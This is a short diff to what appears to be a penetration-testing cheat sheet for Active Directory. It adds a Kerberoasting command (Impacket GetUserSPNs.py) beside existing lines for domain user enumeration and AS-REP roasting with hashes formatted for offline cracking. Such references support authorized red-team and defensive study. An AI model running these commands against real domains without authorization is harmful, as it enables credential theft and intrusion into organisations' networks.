@@ -663,8 +663,11 @@ net user {USERNAME} /domain
 # Enumerate all groups in domain
 net group /domain
 
-# Get Active Directory Users
+# Get active directory users
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
+
+# Get user SPN
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
 
 # ASREP ROAST
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1.DOMAIN2}/ -dc-ip {IP ADDRESS} -format john
